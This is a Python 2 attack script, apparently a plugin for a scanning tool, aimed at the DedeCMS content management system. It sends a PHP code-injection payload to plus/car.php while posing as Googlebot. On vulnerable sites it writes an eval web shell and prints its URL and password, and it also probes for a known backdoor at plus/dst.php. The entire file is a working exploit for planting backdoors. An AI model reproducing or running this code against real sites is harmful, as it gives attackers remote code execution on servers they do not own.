#/usr/bin/python2.7
#coding=gb2312
#by shaoxiao QQ:1006079161 http://www.mdbhack.com

###########dedecms官方一句话扫描##########################
import httplib

class dedecmsyijuhua:
    support = 'dedecms'
    pwd = []
    def isSupport(self,servie):
        if servie in self.support:
            return True
        else:
            return False
    def scan(self,arg,servie):
        if not self.isSupport(servie):
            return None
        url = arg.split('//')[1]
        site = '/5.66/plus/car.php'
        data = '''$a=${@phpinfo()};'''
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Content-type":"application/x-www-form-urlencoded"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('POST',site,data,heareds)
            httpres = conn.getresponse()
            html = httpres.read()
            if 'allow_url_fopen' in html:
                self.echo(url)
            else:
                self.find(url)
        except Exception,e:
            print e
            return False
    def echo(self,arg):
        site = '/plus/car.php'
        data = '''$a=${@file_put_contents("shaoxiao.php","<?php eval(\$_POST[woaini]); ?>")};'''
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(arg)
        try:
            conn.request('POST',site,data,heareds)
            httpres = conn.getresponse()
            print 'shell:http://%s/plus/shaoxiao.php pass:woaini' % arg
        except Exception,e:
            print e
            return False
            
    def find(self,arg):
        site = '/plus/dst.php'
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(arg)
        try:
            conn.request('GET',site,None,heareds)
            httpres = conn.getresponse()
            if httpres.status == 200:
                print 'shell:http://%s/plus/dst.php pass:cmd' % arg
        except Exception,e:
            print e
            return False
